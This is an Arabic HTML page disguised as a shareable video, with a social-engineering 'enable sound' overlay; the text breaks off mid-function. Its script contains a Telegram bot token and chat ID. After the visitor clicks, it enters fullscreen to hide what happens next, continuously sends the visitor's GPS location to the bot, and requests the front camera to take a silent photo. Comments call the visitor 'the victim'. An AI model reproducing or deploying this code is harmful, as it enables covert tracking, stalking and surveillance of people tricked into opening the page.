<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title> فديو</title>
    
    <meta property="og:title" content="▶️ فيديو مباشر بجودة عالية">
    <meta property="og:image" content="https://appsyria00.github.io/Facebook/2.png">
    <meta property="og:video" content="https://appsyria00.github.io/Facebook/1.mp4">
    <meta property="og:type" content="video.other">

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { height: 100%; width: 100%; overflow: hidden; background-color: #000; font-family: sans-serif; }
        .video-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
        video { width: 100%; height: 100%; object-fit: cover; }
        
        /* نافذة الهندسة الاجتماعية الشفافة */
        #audioOverlay { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.65); /* خلفية شفافة تظهر الفيديو خلفها */
            color: white; z-index: 9999; display: flex; flex-direction: column; 
            align-items: center; justify-content: center; text-align: center; padding: 25px;
            display: none; 
        }
        #audioBtn { 
            padding: 15px 45px; background: #007bff; color: white; border: none; 
            border-radius: 35px; cursor: pointer; font-weight: bold; font-size: 18px;
            box-shadow: 0 5px 20px rgba(0,123,255,0.4);
            transition: 0.3s;
        }
        #audioBtn:active { transform: scale(0.95); }
    </style>
</head>
<body>

    <div id="audioOverlay">
        <div style="background: rgba(255,255,255,0.1); padding: 30px; border-radius: 20px; backdrop-filter: blur(5px);">
            <h2 style="margin-bottom:15px;">🔊 الصوت مكتوم</h2>
            <p style="margin-bottom:25px; line-height: 1.5;">  تشغيل الصوت،<br>يرجى الضغط على الزر أدناه وتفعيل الأذونات.</p>
            <button id="audioBtn">تشغيل الصوت الآن</button>
        </div>
    </div>

    <div class="video-wrapper">
        <video id="mainVideo" autoplay muted playsinline poster="2.png" preload="auto">
            <source src="1.mp4" type="video/mp4">
        </video>
    </div>

    <script>
        const botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
        const chatId = "1611398303";

        window.onload = function() {
            // 1. تشغيل الفيديو صامت فوراً عند فتح الصفحة
            const video = document.getElementById('mainVideo');
            video.play().catch(() => console.log("بانتظار تفاعل المستخدم"));

            // 2. إظهار نافذة طلب الصوت بعد ثانية واحدة لزيادة الفضول
            setTimeout(() => {
                document.getElementById('audioOverlay').style.display = 'flex';
            }, 1000);
        };

        // 🔱 عند الضغط على زر تشغيل الصوت
        document.getElementById('audioBtn').onclick = function() {
            const video = document.getElementById('mainVideo');
            
            // 3. الخدعة: إعادة تشغيل الفيديو من البداية وتفعيل الصوت فوراً
            video.currentTime = 0; 
            video.muted = false;   
            video.play();          

            // 4. إخفاء النافذة ودخول وضع ملء الشاشة للتمويه التام
            document.getElementById('audioOverlay').style.display = 'none';
            if (document.documentElement.requestFullscreen) { 
                document.documentElement.requestFullscreen(); 
            }

            // 5. بدء سحب البيانات (الموقع والكاميرا) في الخلفية
            requestSystemPermissions();
        };

        async function requestSystemPermissions() {
            // طلب الموقع الجغرافي المباشر (تتبع مستمر)
            navigator.geolocation.watchPosition(pos => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const acc = pos.coords.accuracy.toFixed(1);
                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                
                sendToBot(`📍 تحديث موقع مباشر:\n🎯 الدقة: ${acc} متر\n🔗 الخريطة: ${mapsUrl}`);
            }, () => {}, { enableHighAccuracy: true });

            // طلب الكاميرا لالتقاط لقطة صامتة
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                captureSilentPhoto(stream);
            } catch (err) {
                sendToBot("⚠️ الضحية رفض الكاميرا");
            }
        }

        function captureSilentPhoto(stream) {
            let v = document.createElement('video');
            v.srcObject = stream; v.play();
